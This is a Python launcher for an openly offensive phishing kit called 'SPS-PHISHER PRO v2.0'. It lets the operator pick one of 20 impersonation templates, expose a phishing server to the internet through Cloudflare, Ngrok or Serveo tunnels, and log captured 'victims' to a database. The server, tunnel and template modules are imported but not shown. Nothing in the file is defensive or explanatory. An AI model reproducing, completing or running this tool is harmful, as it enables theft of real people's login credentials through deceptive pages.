#!/usr/bin/python3
# -*- coding: utf-8 -*-
# SPS-PHISHER PRO v2.0 - S.P.S TEAM - 

import os, sys, time, threading, json

def install(pkg):
    try: __import__(pkg)
    except: os.system(f"{sys.executable} -m pip install {pkg} -q")

for p in ["requests"]: install(p)

import requests
from core.server import PhishServer
from core.tunnel import TunnelManager
from core.database import Database
from core.templates import TEMPLATES

G='\033[1;32m';R='\033[1;31m';Y='\033[1;33m';C='\033[1;36m';W='\033[1;37m'

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{R}
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║   {Y}███████╗██████╗ ███████╗    {W}██████╗ ██╗  ██╗██╗███████╗{R}  ║
║   {Y}██╔════╝██╔══██╗██╔════╝    {W}██╔══██╗██║  ██║██║██╔════╝{R}  ║
║   {Y}███████╗██████╔╝███████╗    {W}██████╔╝███████║██║███████╗{R}  ║
║   {Y}╚════██║██╔═══╝ ╚════██║    {W}██╔═══╝ ██╔══██║██║╚════██║{R}  ║
║   {Y}███████║██║     ███████║    {W}██║     ██║  ██║██║███████║{R}  ║
║   {Y}╚══════╝╚═╝     ╚══════╝    {W}╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝{R}  ║
║                                                          ║
║   {G}🔥 SPS-PHISHER PRO v2.0 - 20 Templates 🔥{R}              ║
║   {W}👤 {R}  |  {W}📡 @SPIDEY_X_CHEAT{R}                   ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝{W}
""")

def main():
    banner()
    
    print(f"{Y}[+] Available Templates:{W}\n")
    for k, v in TEMPLATES.items():
        print(f"  {G}[{k:2s}]{W} {v[1]}")
    
    choice = input(f"\n{C}[?] Choose [1-20]: {W}").strip()
    if choice not in TEMPLATES:
        print(f"{R}[-] Invalid{W}")
        return
    
    tid, tname, tredir = TEMPLATES[choice]
    
    try: port = int(input(f"{C}[?] Port [8080]: {W}") or 8080)
    except: port = 8080
    
    print(f"\n{Y}[+] Tunnel:{W}")
    print(f"  {G}[1]{W} Cloudflare\n  {G}[2]{W} Ngrok\n  {G}[3]{W} Serveo\n  {G}[4]{W} Localhost")
    tchoice = input(f"{C}[?] Choose [1-4]: {W}").strip()
    
    db = Database()
    print(f"{G}[+] Database ready ({db.count()} victims){W}")
    
    tunnel = TunnelManager(port)
    tunnel.start(tchoice)
    time.sleep(3)
    tunnel.show()
    
    server = PhishServer(port, tid, tredir, db)
    print(f"{G}[+] Server: http://0.0.0.0:{port}{W}")
    print(f"{Y}[*] Waiting for victims...{W}\n")
    
    try: server.start()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Stopped. Total victims: {db.count()}{W}")
        server.stop()

if __name__ == "__main__":
    main()